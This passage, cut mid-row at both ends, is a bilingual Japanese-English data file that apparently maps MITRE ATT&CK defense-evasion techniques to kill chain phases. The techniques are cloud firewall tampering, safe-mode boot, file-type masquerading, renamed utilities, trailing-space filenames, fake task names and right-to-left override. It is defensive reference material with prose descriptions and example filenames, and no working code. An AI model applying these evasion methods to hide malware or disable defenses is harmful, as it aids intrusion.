攻撃者はまた、ユーザーのログアウトをブロックしたり、システムのシャットダウンを妨げたり、更新プロセスを無効化または変更したりするなど、防御的な衛生状態に寄与する日常業務を損なう可能性があります。攻撃者はまた、イベント集約および分析メカニズムを標的にしたり、他のシステムコンポーネントを変更することによってこれらの手順を混乱させたりする可能性もあります。これらの制限により、悪意のある操作やインシデントの継続的な伝播がさらに可能になる可能性があります。(引用: Google Cloud Mandiant UNC3886 2024)(引用: Emotet shutdown)","Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.

Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Google Cloud Mandiant UNC3886 2024)(Citation: Emotet shutdown)",T1562.007,クラウドファイアウォールの無効化または変更,Disable or Modify Cloud Firewall,"攻撃者は、クラウドリソースへのアクセスを制限する制御をバイパスするために、クラウド環境内のファイアウォールを無効化または変更する可能性があります。クラウドファイアウォールは、[システムファイアウォールの無効化または変更](https://attack.mitre.org/techniques/T1562/004)で説明されているシステムファイアウォールとは異なります。

クラウド環境は通常、予想されるポートとプロトコルを介して信頼できるIPアドレスからのネットワークアクティビティのみを許可する制限的なセキュリティグループとファイアウォールルールを利用します。適切な権限を持つ攻撃者は、被害者のクラウド環境へのアクセスを許可したり、クラウドコントロールプレーンからデータプレーンに横方向に移動したりするために、新しいファイアウォールルールまたはポリシーを導入する可能性があります。例えば、攻撃者は、既存のセキュリティグループに新しいイングレスルールを作成する（または完全に新しいセキュリティグループを作成する）スクリプトまたはユーティリティを使用して、クラウドホスト型インスタンスへの任意のTCP/IP接続を許可する可能性があります。(引用: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022) また、悪意のあるアクティビティ（クリプトマイニングなど）に関連するトラフィックをサポートするために、ネットワーク制限を削除する可能性もあります。(引用: Expel IO Evil in AWS)(引用: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)

クラウドファイアウォールを変更または無効にすると、他の方法では許可されない攻撃者のC2通信、横方向の移動、および/またはデータ持ち出しが可能になる場合があります。また、[ブルートフォース](https://attack.mitre.org/techniques/T1110)または[エンドポイントサービス拒否](https://attack.mitre.org/techniques/T1499)のためにリソースを開放するために使用される場合もあります。","Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004).

Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary with appropriate permissions may introduce new firewall rules or policies to allow access into a victim cloud environment and/or move laterally from the cloud control plane to the data plane. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups (or creates new security groups entirely) to allow any TCP/IP connectivity to a cloud-hosted instance.(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022) They may also remove networking limitations to support traffic associated with malicious activity (such as cryptomining).(Citation: Expel IO Evil in AWS)(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)

Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. It may also be used to open up resources for [Brute Force](https://attack.mitre.org/techniques/T1110) or [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1562,防御の阻害,Impair Defenses,"攻撃者は、防御メカニズムを妨害または無効にするために、被害者環境のコンポーネントを悪意を持って変更する可能性があります。これには、ファイアウォールやウイルス対策などの予防的防御を損なうだけでなく、防御側がアクティビティを監査し悪意のある行動を特定するために使用できる検出機能も含まれます。これはまた、ネイティブの防御と、ユーザーや管理者によってインストールされた補足機能の両方に及ぶ可能性があります。

攻撃者はまた、ユーザーのログアウトをブロックしたり、システムのシャットダウンを妨げたり、更新プロセスを無効化または変更したりするなど、防御的な衛生状態に寄与する日常業務を損なう可能性があります。攻撃者はまた、イベント集約および分析メカニズムを標的にしたり、他のシステムコンポーネントを変更することによってこれらの手順を混乱させたりする可能性もあります。これらの制限により、悪意のある操作やインシデントの継続的な伝播がさらに可能になる可能性があります。(引用: Google Cloud Mandiant UNC3886 2024)(引用: Emotet shutdown)","Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.

Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Google Cloud Mandiant UNC3886 2024)(Citation: Emotet shutdown)",T1562.009,セーフモードブート,Safe Mode Boot,"攻撃者はWindowsのセーフモードを悪用してエンドポイントの防御を無効にする可能性があります。セーフモードは、限られたドライバとサービスのセットでWindowsオペレーティングシステムを起動します。エンドポイント検出応答（EDR）ツールなどのサードパーティ製セキュリティソフトウェアは、セーフモードでWindowsを起動した後は起動しない場合があります。セーフモードには、セーフモードとセーフモード（ネットワーク対応）の2つのバージョンがあります。セーフモード起動後に他のサービスを開始することも可能です。(引用: Microsoft Safe Mode)(引用: Sophos Snatch Ransomware 2019)

攻撃者は、限定的な起動では開始されない可能性のあるエンドポイント防御を無効にするためにセーフモードを悪用する可能性があります。ホストは、ブートアプリケーション設定を管理するファイルであるブート構成データ（BCD）ストアを変更することにより、次の再起動後にセーフモードに強制的に移行させることができます。(引用: Microsoft bcdedit 2021)

攻撃者はまた、関連するレジストリ値を変更することにより（つまり、[レジストリの変更](https://attack.mitre.org/techniques/T1112)）、セーフモードで起動する最小限のサービスのリストに悪意のあるアプリケーションを追加する可能性があります。悪意のある[コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001)（COM）オブジェクトも、セーフモードで登録およびロードされる可能性があります。(引用: Sophos Snatch Ransomware 2019)(引用: CyberArk Labs Safe Mode 2016)(引用: Cybereason Nocturnus MedusaLocker 2020)(引用: BleepingComputer REvil 2021)","Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.(Citation: Microsoft Safe Mode)(Citation: Sophos Snatch Ransomware 2019)

Adversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.(Citation: Microsoft bcdedit 2021)

Adversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)). Malicious [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) objects may also be registered and loaded in safe mode.(Citation: Sophos Snatch Ransomware 2019)(Citation: CyberArk Labs Safe Mode 2016)(Citation: Cybereason Nocturnus MedusaLocker 2020)(Citation: BleepingComputer REvil 2021)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1036,マスカレード,Masquerading,"攻撃者は、アーティファクトの機能を操作して、ユーザーやセキュリティツールに対して正当または無害に見せかけようとする可能性があります。マスカレードは、防御や監視を回避するために、正当か悪意のあるかにかかわらず、オブジェクトの名前や場所が操作されたり悪用されたりする場合に発生します。これには、ファイルメタデータの操作、ユーザーを騙してファイルタイプを誤認させること、正当なタスクやサービス名を与えることなどが含まれる場合があります。

セキュリティ監視を回避するために悪用可能なシステムユーティリティの名前を変更することも、[マスカレード](https://attack.mitre.org/techniques/T1036)の一形態です。(引用：LOLBASメインサイト)","Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.

Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",T1036.008,ファイルタイプの偽装,Masquerade File Type,"攻撃者は、ペイロードのフォーマット（ファイルの署名、拡張子、アイコン、内容など）を変更することで、悪意のあるペイロードを正当なファイルに見せかける可能性があります。さまざまなファイルタイプには、エンコード方法や構成方法など、典型的な標準フォーマットがあります。例えば、ファイルの署名（ヘッダーまたはマジックバイトとも呼ばれる）はファイルの先頭バイトであり、ファイルのタイプを識別するためによく使用されます。例えば、JPEGファイルのヘッダーは<code>0xFF 0xD8</code>で、ファイル拡張子は<code>.JPE</code>、<code>.JPEG</code>、または<code>.JPG</code>のいずれかです。

攻撃者は、ファイル検証チェックや入力サニタイズをバイパスするために、悪意のあるペイロードのヘッダーの16進コードやファイル拡張子を編集する可能性があります。この動作は、攻撃者が検出をトリガーせずにマルウェアを移動できるようにするために、ペイロードファイルが転送される（例：[イングレスツール転送](https://attack.mitre.org/techniques/T1105)）および保存される（例：[マルウェアのアップロード](https://attack.mitre.org/techniques/T1608/001)）ときに一般的に使用されます。

テキストファイル（`.txt`）や画像ファイル（`.jpg`、`.gif`など）のような一般的な非実行可能ファイルタイプと拡張子は、通常、良性のものとして扱われます。これに基づいて、攻撃者はファイル拡張子を使用してマルウェアを偽装する可能性があり、例えばPHPバックドアコードに<code>test.gif</code>というファイル名を付けるなどです。ユーザーは、良性の外観とファイル拡張子のためにファイルが悪意のあるものであることを知らない可能性があります。

ポリグロットファイルは、複数の異なるファイルタイプを持ち、それらを実行するアプリケーションに基づいて異なる動作をするファイルであり、悪意のあるマルウェアや機能を偽装するためにも使用される可能性があります。(引用: polygot_icedID)","Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file’s signature, extension, icon, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file’s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file’s type. For example, the header of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension is either `.JPE`, `.JPEG` or `.JPG`.

Adversaries may edit the header’s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and stored (e.g., [Upload Malware](https://attack.mitre.org/techniques/T1608/001)) so that adversaries may move their malware without triggering detections.

Common non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of <code>test.gif</code>. A user may not know that a file is malicious due to the benign appearance and file extension.

Polygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.(Citation: polygot_icedID)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1036,マスカレード,Masquerading,"攻撃者は、アーティファクトの機能を操作して、ユーザーやセキュリティツールに対して正当または無害に見せかけようとする可能性があります。マスカレードは、防御や監視を回避するために、正当か悪意のあるかにかかわらず、オブジェクトの名前や場所が操作されたり悪用されたりする場合に発生します。これには、ファイルメタデータの操作、ユーザーを騙してファイルタイプを誤認させること、正当なタスクやサービス名を与えることなどが含まれる場合があります。

セキュリティ監視を回避するために悪用可能なシステムユーティリティの名前を変更することも、[マスカレード](https://attack.mitre.org/techniques/T1036)の一形態です。(引用：LOLBASメインサイト)","Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.

Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",T1036.003,正当なユーティリティの名前変更,Rename Legitimate Utilities,攻撃者は、これらのユーティリティの使用に関するセキュリティメカニズムを回避するために、正当な/システムユーティリティの名前を変更する可能性があります。組み込みのバイナリや、PSExec、AutoHotKey、IronPythonなどのツールを含む、攻撃者が悪用できる正当なユーティリティに対して、セキュリティ監視および制御メカニズムが導入されている場合があります。(引用: LOLBAS Main Site)(引用: Huntress Python Malware 2025)(引用: The DFIR Report AutoHotKey 2023)(引用: Splunk Detect Renamed PSExec) 利用前にユーティリティの名前を変更することにより（例：<code>rundll32.exe</code>の名前を変更）、これらのセキュリティメカニズムをバイパスできる可能性があります。(引用: Elastic Masquerade Ball) 正当なユーティリティが別のディレクトリにコピーまたは移動され、これらのユーティリティが非標準パスから実行されることに基づく検出を回避するために名前が変更されるという代替ケースが発生します。(引用: F-Secure CozyDuke),"Adversaries may rename legitimate / system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for legitimate utilities adversaries are capable of abusing, including both built-in binaries and tools such as PSExec, AutoHotKey, and IronPython.(Citation: LOLBAS Main Site)(Citation: Huntress Python Malware 2025)(Citation: The DFIR Report AutoHotKey 2023)(Citation: Splunk Detect Renamed PSExec) It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>).(Citation: Elastic Masquerade Ball) An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on these utilities executing from non-standard paths.(Citation: F-Secure CozyDuke)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1036,マスカレード,Masquerading,"攻撃者は、アーティファクトの機能を操作して、ユーザーやセキュリティツールに対して正当または無害に見せかけようとする可能性があります。マスカレードは、防御や監視を回避するために、正当か悪意のあるかにかかわらず、オブジェクトの名前や場所が操作されたり悪用されたりする場合に発生します。これには、ファイルメタデータの操作、ユーザーを騙してファイルタイプを誤認させること、正当なタスクやサービス名を与えることなどが含まれる場合があります。

セキュリティ監視を回避するために悪用可能なシステムユーティリティの名前を変更することも、[マスカレード](https://attack.mitre.org/techniques/T1036)の一形態です。(引用：LOLBASメインサイト)","Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.

Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",T1036.006,ファイル名の後のスペース,Space after Filename,"攻撃者は、ファイルの拡張子を変更することで、プログラムの真のファイルタイプを隠すことができます。特定のファイルタイプ（特に.app拡張子では機能しません）では、ファイル名の末尾にスペースを追加すると、オペレーティングシステムによるファイルの処理方法が変わります。

例えば、<code>evil.bin</code>というMach-O実行可能ファイルがある場合、ユーザーがダブルクリックするとTerminal.appが起動して実行されます。このファイルの名前を<code>evil.txt</code>に変更すると、ユーザーがダブルクリックしたときにデフォルトのテキスト編集アプリケーションで起動します（バイナリは実行されません）。しかし、ファイルの名前を<code>evil.txt </code>（末尾にスペースがあることに注意）に変更すると、ユーザーがダブルクリックしたときにOSによって真のファイルタイプが決定されて適切に処理され、バイナリが実行されます。(引用: Mac Backdoors are back)

攻撃者はこの機能を使用して、ユーザーを騙して任意の形式の無害に見えるファイルをクリックさせ、最終的に悪意のあるものを実行させることができます。","Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.

For example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt </code> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back).

Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1036,マスカレード,Masquerading,"攻撃者は、アーティファクトの機能を操作して、ユーザーやセキュリティツールに対して正当または無害に見せかけようとする可能性があります。マスカレードは、防御や監視を回避するために、正当か悪意のあるかにかかわらず、オブジェクトの名前や場所が操作されたり悪用されたりする場合に発生します。これには、ファイルメタデータの操作、ユーザーを騙してファイルタイプを誤認させること、正当なタスクやサービス名を与えることなどが含まれる場合があります。

セキュリティ監視を回避するために悪用可能なシステムユーティリティの名前を変更することも、[マスカレード](https://attack.mitre.org/techniques/T1036)の一形態です。(引用：LOLBASメインサイト)","Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.

Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",T1036.004,タスクまたはサービスの偽装,Masquerade Task or Service,"攻撃者は、タスクやサービスの名前を操作して、正当または無害に見せかけようとする可能性があります。タスクスケジューラやsystemdによって実行されるタスク/サービスには、通常、名前や説明が付与されます。(引用: TechNet Schtasks)(引用: Systemd Service Units) Windowsサービスには、サービス名と表示名があります。一般的に関連付けられている名前を持つ多くの無害なタスクやサービスが存在します。攻撃者は、タスクやサービスに正当なものと類似または同一の名前を付ける可能性があります。

タスクやサービスには、説明など、攻撃者が正当に見せかけようとする可能性のある他のフィールドが含まれています。(引用: Palo Alto Shamoon Nov 2016)(引用: Fysbis Dr Web Analysis)","Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.

Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1036,マスカレード,Masquerading,"攻撃者は、アーティファクトの機能を操作して、ユーザーやセキュリティツールに対して正当または無害に見せかけようとする可能性があります。マスカレードは、防御や監視を回避するために、正当か悪意のあるかにかかわらず、オブジェクトの名前や場所が操作されたり悪用されたりする場合に発生します。これには、ファイルメタデータの操作、ユーザーを騙してファイルタイプを誤認させること、正当なタスクやサービス名を与えることなどが含まれる場合があります。

セキュリティ監視を回避するために悪用可能なシステムユーティリティの名前を変更することも、[マスカレード](https://attack.mitre.org/techniques/T1036)の一形態です。(引用：LOLBASメインサイト)","Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.

Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",T1036.002,右から左へのオーバーライド,Right-to-Left Override,"攻撃者は、右から左へのオーバーライド（RTLOまたはRLO）文字（U+202E）を悪用して、文字列やファイル名を偽装し、無害に見せかける可能性があります。RTLOは、それに続くテキストを逆順に表示させる非表示のUnicode文字です。例えば、<code>March 25 \\u202Excod.scr</code>という名前のWindowsスクリーンセーバー実行可能ファイルは、<code>March 25 rcs.docx</code>と表示されます。<code>photo_high_re\\u202Egnp.js</code>という名前のJavaScriptファイルは、<code>photo_high_resj.png</code>と表示されます。(引用: Infosecinstitute RTLO Technique)

攻撃者は、ユーザーを騙して無害なファイルタイプだと思わせて実行させる手段として、RTLO文字を悪用する可能性があります。このテクニックの一般的な使用法は、[スピアフィッシング添付ファイル](https://attack.mitre.org/techniques/T1566/001)/[悪意のあるファイル](https://attack.mitre.org/techniques/T1204/002)です。なぜなら、ツールがRTLO文字をどのように表示・レンダリングするかを知らない場合、エンドユーザーと防御者の両方を騙すことができるからです。RTLO文字の使用は、多くの標的型侵入攻撃や犯罪行為で見られています。(引用: Trend Micro PLEAD RTLO)(引用: Kaspersky RTLO Cyber Crime) RTLOはWindowsレジストリでも使用でき、regedit.exeは反転した文字を表示しますが、コマンドラインツールreg.exeはデフォルトでは表示しません。","Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \\u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.(Citation: Infosecinstitute RTLO Technique)

Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious File](https://attack.mitre.org/techniques/T1204/002) since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further 